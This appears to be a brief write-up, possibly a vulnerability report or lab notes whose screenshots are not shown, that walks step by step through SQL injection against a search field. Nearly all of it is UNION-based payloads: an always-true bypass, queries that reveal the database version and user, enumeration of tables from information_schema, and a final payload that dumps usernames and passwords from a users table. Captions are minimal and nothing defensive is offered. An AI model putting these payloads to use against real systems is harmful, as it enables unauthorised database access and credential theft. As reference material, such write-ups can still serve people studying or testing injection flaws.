
![image](https://user-images.githubusercontent.com/75846902/213949910-e16ed004-c048-43aa-9294-e9b617d35435.png)
payload:
`%' or 1=1-- -`

detect to version
![image](https://user-images.githubusercontent.com/75846902/213949995-0a507d40-009c-49a7-b9e4-1756b5d3145e.png)
payload:
`%' or 1=1 union select null,version()-- -`

detect to user
![image](https://user-images.githubusercontent.com/75846902/213950162-6dfe6380-7714-4866-bf7f-0d8a558c6e84.png)
payload:
`%' or 1=1 union select null,user()-- -`

detect to table
![image](https://user-images.githubusercontent.com/75846902/213950250-3395d0c4-7424-47fa-a05d-035f1558b357.png)
payload:
`%' or 1=1 union select null,table_name from information_schema.tables-- -`

detect to table_name 'user'
![image](https://user-images.githubusercontent.com/75846902/213950803-ab3c7679-e56e-4e0c-aa03-60a32836160d.png)
payload:
`%' or 1=1 union select null,table_name from information_schema.tables where table_name like 'user%'-- -`


detect to columns from users_table
![image](https://user-images.githubusercontent.com/75846902/213950769-8a858d77-ab33-4ded-9667-55b56e0424db.png)
payload:
'%' or 1=1 union select null, concat(user,0x0a,password) from users-- -'

